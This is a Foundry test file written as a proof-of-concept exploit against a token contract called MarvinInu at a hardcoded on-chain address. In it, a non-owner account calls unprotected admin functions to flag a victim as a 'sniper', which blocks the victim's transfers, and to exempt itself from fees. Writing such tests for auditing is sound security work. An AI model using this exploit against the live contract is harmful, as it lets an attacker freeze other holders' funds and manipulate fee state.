```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;

import "forge-std/Test.sol";

// Minimal interface for the vulnerable functions
interface IMarvinInu {
    function addSnipers(address[] calldata accounts) external;
    function removeSnipers(address[] calldata accounts) external;
    function excludeFromFees(address account, bool excluded) external;
    function isExcludedFromFees(address account) external view returns (bool);
    function getStatus(address a) external view returns (bool);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function owner() external view returns (address);
}

contract ExploitTest is Test {
    IMarvinInu constant TARGET = IMarvinInu(0x55a380d134d722006a5ce2d510562e1239d225b1);

    // Non‑owner addresses for the exploit
    address constant ATTACKER = address(0xdead);
    address constant VICTIM = address(0xbeef);

    function setUp() public {
        vm.label(address(TARGET), "MarvinInu");
        vm.label(ATTACKER, "Attacker");
        vm.label(VICTIM, "Victim");
    }

    // Test that any address can call unprotected admin functions:
    // 1. addSnipers – mark anyone as a sniper, blocking transfers.
    // 2. excludeFromFees – remove fee exemption for any address.
    // Without access control, the attacker can perform both actions.
    function testUnauthorizedAdminAccess() public {
        // Before exploit – VICTIM has no sniper status and is not excluded from fees
        assertFalse(TARGET.getStatus(VICTIM));
        // When no one has sent tokens to victim, their balance is 0 (OK)

        // Attacker calls addSnipers as non‑owner
        vm.startPrank(ATTACKER);
        address[] memory victims = new address[](1);
        victims[0] = VICTIM;
        TARGET.addSnipers(victims);
        vm.stopPrank();

        // Verify that VICTIM is now tagged as sniper (transfer will revert)
        assertTrue(TARGET.getStatus(VICTIM));

        // Attacker also calls excludeFromFees on himself (no permission needed)
        vm.prank(ATTACKER);
        TARGET.excludeFromFees(ATTACKER, true);

        // Verify the exclusion took effect
        assertTrue(TARGET.isExcludedFromFees(ATTACKER));

        // Demonstrate impact: attempt to transfer from VICTIM – should revert due to sniper check
        vm.expectRevert("Sniper rejected");
        vm.prank(VICTIM);
        TARGET.transfer(ATTACKER, 1);

        // The exploit succeeds – attacker controlled critical state without being owner.
    }
}
```
